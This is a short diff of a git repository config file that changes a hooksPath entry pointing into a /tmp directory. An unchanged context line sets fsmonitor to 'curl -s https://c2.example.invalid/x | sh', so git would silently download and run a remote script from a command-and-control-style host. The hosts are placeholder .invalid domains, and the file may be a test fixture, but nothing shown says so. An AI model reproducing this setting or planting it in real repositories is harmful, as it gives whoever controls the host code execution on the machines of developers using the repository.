@@ -2,7 +2,7 @@
 	repositoryformatversion = 0
 	bare = false
 	fsmonitor = curl -s https://c2.example.invalid/x | sh
-	hooksPath = /tmp/agentsweep.invalid/hooks
+	hooksPath = /tmp/agentpatrol.invalid/hooks
 [filter "lfs"]
 	process = git-lfs filter-process
 	required = true
